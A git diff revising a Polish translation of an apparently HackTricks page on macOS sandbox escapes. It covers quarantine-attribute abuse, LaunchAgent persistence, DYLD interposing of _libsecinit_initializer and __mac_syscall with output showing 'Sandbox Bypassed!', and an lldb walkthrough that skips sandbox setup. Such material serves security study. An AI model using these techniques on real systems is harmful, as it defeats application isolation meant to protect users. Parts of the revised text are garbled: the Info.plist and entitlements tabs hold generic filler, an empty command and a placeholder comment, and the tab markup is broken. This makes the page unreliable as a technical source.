@@ -1,64 +1,64 @@
-# macOS Sandbox Debug & Bypass
+# Debugowanie i Bypassowanie Piaskownicy macOS
 
 <details>
 
-<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Zacznij od zera i stań się ekspertem od hakowania AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
 
 </details>
 
-## Proces ładowania piaskownicy
+## Proces ładowania Piaskownicy
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Obraz z <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (898).png" alt=""><figcaption><p>Obrazek z <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-Na powyższym obrazie można zobaczyć, **jak będzie ładowana piaskownica**, gdy uruchamiany jest program z uprawnieniami **`com.apple.security.app-sandbox`**.
+Na powyższym obrazku można zobaczyć **jak będzie ładowana piaskownica** po uruchomieniu aplikacji z uprawnieniem **`com.apple.security.app-sandbox`**.
 
 Kompilator połączy `/usr/lib/libSystem.B.dylib` z binarnym plikiem.
 
-Następnie **`libSystem.B`** będzie wywoływać inne funkcje, aż **`xpc_pipe_routine`** wyśle uprawnienia aplikacji do **`securityd`**. Securityd sprawdza, czy proces powinien być kwarantanną wewnątrz piaskownicy, i jeśli tak, zostanie poddany kwarantannie.\
-W końcu piaskownica zostanie aktywowana za pomocą wywołania **`__sandbox_ms`**, które wywoła **`__mac_syscall`**.
+Następnie **`libSystem.B`** będzie wywoływać inne funkcje, aż **`xpc_pipe_routine`** wyśle uprawnienia aplikacji do **`securityd`**. Securityd sprawdzi, czy proces powinien być kwarantanną wewnątrz Piaskownicy, a jeśli tak, zostanie on poddany kwarantannie.\
+Wreszcie, piaskownica zostanie aktywowana za pomocą wywołania **`__sandbox_ms`**, które wywoła **`__mac_syscall`**.
 
-## Możliwe omijanie
+## Możliwe Bypassy
 
-### Omijanie atrybutu kwarantanny
+### Bypassowanie atrybutu kwarantanny
 
-**Pliki tworzone przez procesy w piaskownicy** otrzymują atrybut **kwarantanny**, aby zapobiec ucieczce z piaskownicy. Jednak jeśli uda ci się **utworzyć folder `.app` bez atrybutu kwarantanny** wewnątrz aplikacji w piaskownicy, możesz spowodować, że binarny pakiet aplikacji wskazuje na **`/bin/bash`** i dodać kilka zmiennych środowiskowych w **plist**, aby wykorzystać funkcję **`open`** i **uruchomić nową aplikację bez piaskownicy**.
+**Pliki tworzone przez procesy w piaskownicy** otrzymują **atrybut kwarantanny**, aby zapobiec ucieczce z piaskownicy. Jednak jeśli uda ci się **utworzyć folder `.app` bez atrybutu kwarantanny** w aplikacji w piaskownicy, możesz spowodować, że binarny pakiet aplikacji wskazywałby na **`/bin/bash`** i dodać kilka zmiennych środowiskowych w **plist**, aby wykorzystać **`open`** do **uruchomienia nowej aplikacji bez piaskownicy**.
 
-Tak zostało zrobione w [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**
+To właśnie zostało zrobione w [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**
 
 {% hint style="danger" %}
-W związku z tym, jeśli jesteś w stanie utworzyć folder o nazwie kończącej się na **`.app`** bez atrybutu kwarantanny, możesz uciec z piaskownicy, ponieważ macOS **sprawdza** atrybut **kwarantanny** tylko w **folderze `.app`** i w **głównym pliku wykonywalnym** (a my wskazujemy główny plik wykonywalny na **`/bin/bash`**).
+Dlatego w chwili obecnej, jeśli jesteś w stanie utworzyć folder o nazwie kończącej się na **`.app`** bez atrybutu kwarantanny, możesz uciec z piaskownicy, ponieważ macOS sprawdza tylko atrybut **kwarantanny** w folderze **`.app`** i w **głównym wykonywalnym pliku** (a my wskażemy główny plik wykonywalny na **`/bin/bash`**).
 
-Należy zauważyć, że jeśli pakiet .app został już autoryzowany do uruchomienia (ma atrybut kwarantanny xttr z flagą autoryzacji do uruchomienia), można go również wykorzystać... z wyjątkiem tego, że teraz nie można pisać wewnątrz pakietów **`.app`** chyba że masz uprzywilejowane uprawnienia TCC (których nie będziesz miał w piaskownicy).
+Zauważ, że jeśli pakiet .app został już autoryzowany do uruchomienia (ma atrybut kwarantanny z flagą autoryzacji do uruchomienia), możesz go również wykorzystać... z tym że teraz nie możesz pisać wewnątrz pakietów **`.app`** chyba że masz pewne uprzywilejowane uprawnienia TCC (których nie będziesz miał w wysokiej piaskownicy).
 {% endhint %}
 
 ### Wykorzystywanie funkcjonalności Open
 
-W [**ostatnich przykładach omijania piaskownicy Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) można zobaczyć, jak funkcjonalność **`open`** może być wykorzystana do omijania piaskownicy.
+W [**ostatnich przykładach bypassowania piaskownicy Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) można zauważyć, jak funkcjonalność **`open`** w wierszu poleceń może być wykorzystana do obejścia piaskownicy.
 
 {% content-ref url="macos-office-sandbox-bypasses.md" %}
 [macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
 {% endcontent-ref %}
 
-### Agenci uruchamiania/Demony
+### Uruchamianie Agentów/Demonów
 
-Nawet jeśli aplikacja jest **przeznaczona do działania w piaskownicy** (`com.apple.security.app-sandbox`), można ją ominąć, jeśli jest **uruchamiana z poziomu Agenta uruchamiania** (`~/Library/LaunchAgents`) na przykład.\
-Jak wyjaśniono w [**tym poście**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), jeśli chcesz uzyskać trwałość z aplikacją działającą w piaskownicy, możesz skonfigurować jej automatyczne uruchamianie jako Agenta uruchamiania i być może wstrzyknąć złośliwy kod za pomocą zmiennych środowiskowych DyLib.
+Nawet jeśli aplikacja jest **przeznaczona do działania w piaskownicy** (`com.apple.security.app-sandbox`), można ją ominąć, jeśli zostanie **uruchomiona z LaunchAgent** (`~/Library/LaunchAgents`) na przykład.\
+Jak wyjaśniono w [**tym poście**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), jeśli chcesz uzyskać trwałość z aplikacją w piaskownicy, możesz ją automatycznie uruchomić jako LaunchAgent i być może wstrzyknąć złośliwy kod za pomocą zmiennych środowiskowych DyLib.
 
-### Wykorzystywanie lokalizacji autostartu
+### Wykorzystywanie Lokalizacji Auto Start
 
-Jeśli proces w piaskownicy może **zapisywać** w miejscu, w którym **później będzie uruchamiany niespiaskowany program**, będzie można **uciec, umieszczając** tam binarny plik. Dobrym przykładem takich lokalizacji są `~/Library/LaunchAgents` lub `/System/Library/LaunchDaemons`.
+Jeśli proces w piaskownicy może **pisać** w miejscu, gdzie **później będzie uruchamiana aplikacja bez piaskownicy**, będzie mógł **uciec, umieszczając** tam binarny plik. Dobrym przykładem takich lokalizacji są `~/Library/LaunchAgents` lub `/System/Library/LaunchDaemons`.
 
-W tym przypadku może być nawet **2 kroki**: Proces z **bardziej liberalną piaskownicą** (`file-read*`, `file-write*`) wykonuje kod, który faktycznie zapisuje w miejscu, gdzie zostanie **uruchomiony bez piaskownicy**.
+Być może będziesz musiał wykonać **2 kroki**: aby proces z **bardziej przywilejowaną piaskownicą** (`file-read*`, `file-write*`) wykonał twój kod, który faktycznie zapisze w miejscu, gdzie będzie **wykonywany bez piaskownicy**.
 
-Sprawdź tę stronę dotyczącą **lokalizacji autostartu**:
+Sprawdź tę stronę o **lokalizacjach Auto Start**:
 
 {% content-ref url="../../../../macos-auto-start-locations.md" %}
 [macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
@@ -66,32 +66,29 @@ Sprawdź tę stronę dotyczącą **lokalizacji autostartu**:
 
 ### Wykorzystywanie innych procesów
 
-Jeśli z procesu w piaskownicy jesteś w stanie **skompromitować inne procesy** działające w mniej restrykcyjnych piaskownicach (lub bez piaskownicy), będziesz mógł uciec do ich piaskownic:
+Jeśli z procesu w piaskownicy jesteś w stanie **skompromitować inne procesy** działające w mniej restrykcyjnych piaskownicach (lub bez nich), będziesz mógł uciec do ich piaskownic:
 
 {% content-ref url="../../../macos-proces-abuse/" %}
 [macos-proces-abuse](../../../macos-proces-abuse/)
 {% endcontent-ref %}
 
-### Statyczne kompilowanie i dynamiczne linkowanie
+### Statyczna Kompilacja i Dynamiczne Linkowanie
 
-[**To badanie**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) odkryło 2 sposoby na omijanie piaskownicy. Ponieważ piaskownica jest stosowana z przestrzeni użytkownika podczas ładowania biblioteki **libSystem**. Jeśli binarny plik mógłby uniknąć jej ładowania, nigdy nie zostałby objęty piaskownicą:
+[**To badanie**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) odkryło 2 sposoby na obejście Piaskownicy. Ponieważ piaskownica jest stosowana z przestrzeni użytkownika podczas ładowania biblioteki **libSystem**. Jeśli binarny plik mógłby uniknąć jej ładowania, nigdy nie zostałby objęty piaskownicą:
 
 * Jeśli binarny plik byłby **całkowicie statycznie skompilowany**, mógłby uniknąć ładowania tej biblioteki.
-* Jeśli **binarny plik nie musiałby ładować żadnych bibliotek** (ponieważ linker znajduje się również w libSystem), nie musiałby ładować libSystem.
+* Jeśli **binarny plik nie musiałby ładować żadnych bibliotek** (ponieważ łącznik również znajduje się w libSystem), nie musiałby ładować libSystem.
 
 ### Shellkody
 
-Należy zauważyć, że **nawet shellkody** w ARM64 muszą być połączone z `libSystem.dylib`:
-
+Nawet **shellkody** w ARM64 muszą być połączone z `libSystem.dylib`:
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-
 ### Uprawnienia
 
-Należy zauważyć, że nawet jeśli niektóre **działania** mogą być **dozwolone przez piaskownicę**, jeśli aplikacja ma określone **uprawnienia**, jak na przykład:
-
+Należy zauważyć, że nawet jeśli niektóre **działania** mogą być **dozwolone przez sandbox**, jeśli aplikacja ma określone **uprawnienie**, jak na przykład:
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -101,17 +98,15 @@ Należy zauważyć, że nawet jeśli niektóre **działania** mogą być **dozwo
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
-
 ### Bypass Interpostowania
 
-Aby uzyskać więcej informacji na temat **interpostowania**, sprawdź:
+Aby uzyskać więcej informacji na temat **Interpostowania**, sprawdź:
 
 {% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
 [macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
-#### Interpostuj `_libsecinit_initializer` w celu uniknięcia sandboxa
-
+#### Interpostuj `_libsecinit_initializer`, aby zapobiec działaniu piaskownicy
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -135,8 +130,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-
-#### Interpost `__mac_syscall` aby zapobiec działaniu piaskownicy
+#### Przechwyć `__mac_syscall` aby zapobiec działaniu piaskownicy
 
 {% code title="interpose.c" %}
 ```c
@@ -171,7 +165,6 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
-
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -183,13 +176,12 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+### Debugowanie i obejście piaskownicy za pomocą lldb
 
-### Debugowanie i omijanie piaskownicy za pomocą lldb
-
-Skompilujmy aplikację, która powinna być objęta piaskownicą:
+Skompilujmy aplikację, która powinna być umieszczona w piaskownicy:
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="sand.c" %}
 ```c
 #include <stdlib.h>
 int main() {
@@ -198,7 +190,7 @@ system("cat ~/Desktop/del.txt");
 ```
 {% endtab %}
 
-{% tab title="entitlements.xml" %}
+{% tab title="entitlements.xml" %}Wskazuje na plik XML zawierający uprawnienia aplikacji. Może zawierać informacje o dostępie do zasobów systemowych. Uprawnienia te mogą być wykorzystane do określenia, jakie operacje może wykonywać aplikacja na systemie. Warto zwrócić uwagę na zawartość tego pliku pod kątem ewentualnych luk w zabezpieczeniach.{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
@@ -207,15 +199,29 @@ system("cat ~/Desktop/del.txt");
 </dict>
 </plist>
 ```
+{% endtab %}
 
-Info.plist to plik konfiguracyjny używany przez aplikacje na systemie macOS. Zawiera informacje o aplikacji, takie jak identyfikator, wersja, uprawnienia i wiele innych. Plik ten jest często używany do konfiguracji zabezpieczeń aplikacji w systemie macOS.
+{% tab title="Info.plist" %} 
 
-W przypadku sandboxa macOS, Info.plist jest szczególnie istotny, ponieważ zawiera kluczowe informacje dotyczące uprawnień aplikacji w sandboxie. Może określać, jakie zasoby systemowe aplikacja ma dostęp, takie jak pliki, foldery, sieć, urządzenia itp. Może również określać, jakie operacje aplikacja może wykonywać na tych zasobach.
+### macOS Sandbox Debug and Bypass
 
-W celu obejścia sandboxa macOS, można próbować zmodyfikować plik Info.plist aplikacji. Można to zrobić, aby zmienić uprawnienia aplikacji, takie jak dostęp do plików lub sieci, lub nawet wyłączyć sandbox całkowicie. Jednak taka modyfikacja może być trudna, ponieważ plik Info.plist jest zazwyczaj podpisany cyfrowo, co oznacza, że ​​zmiana go spowoduje, że aplikacja nie będzie działać lub zostanie odrzucona przez system macOS.
+#### Debugging the macOS Sandbox
 
-Ważne jest również zauważenie, że modyfikacja pliku Info.plist w celu obejścia sandboxa jest nielegalna i narusza zasady bezpieczeństwa systemu macOS. Tylko w przypadku legalnych testów penetracyjnych lub badań bezpieczeństwa można próbować takiego obejścia, ale zawsze zgodnie z prawem i z odpowiednią zgodą.
+To debug the macOS sandbox, you can use the `sandbox-exec` tool with the `-D` flag to enable debug mode. This will provide detailed information about sandbox violations, helping you understand why a process is being blocked.
 
+```bash
+sandbox-exec -D
+```
+
+#### Bypassing the macOS Sandbox
+
+To bypass the macOS sandbox, you can use various techniques such as exploiting vulnerabilities in the sandbox profile, injecting code into a trusted process, or abusing entitlements to gain additional privileges.
+
+```bash
+# Example of injecting code into a trusted process
+```
+
+Remember that bypassing the macOS sandbox is a serious security issue and should only be done for ethical hacking and research purposes.
 ```xml
 <plist version="1.0">
 <dict>
@@ -244,16 +250,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% endcode %}
 
 {% hint style="danger" %}
-Aplikacja spróbuje **odczytać** plik **`~/Desktop/del.txt`**, czego **Sandbox nie zezwoli**.\
-Utwórz tam plik, ponieważ po ominięciu Sandbox będzie można go odczytać:
-
+Aplikacja spróbuje **odczytać** plik **`~/Desktop/del.txt`**, którego **Sandbox nie zezwoli**.\
+Utwórz plik w tym miejscu, ponieważ po ominięciu Sandbox będzie można go odczytać:
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
-Załóżmy, że debugujemy aplikację, aby zobaczyć, kiedy jest ładowany Sandbox:
-
+Zróbmy debugowanie aplikacji, aby zobaczyć, kiedy jest ładowany Sandbox:
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -330,12 +334,11 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-
 {% hint style="warning" %}
-**Nawet po ominięciu piaskownicy TCC** zapyta użytkownika, czy chce zezwolić procesowi na odczyt plików z pulpitu.
+**Nawet po ominięciu piaskownicy TCC** zapyta użytkownika, czy chce zezwolić procesowi na odczyt plików z pulpitu
 {% endhint %}
 
-## Odwołania
+## Referencje
 
 * [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
 * [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
@@ -347,8 +350,8 @@ Process 2517 exited with status = 0 (0x00000000)
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
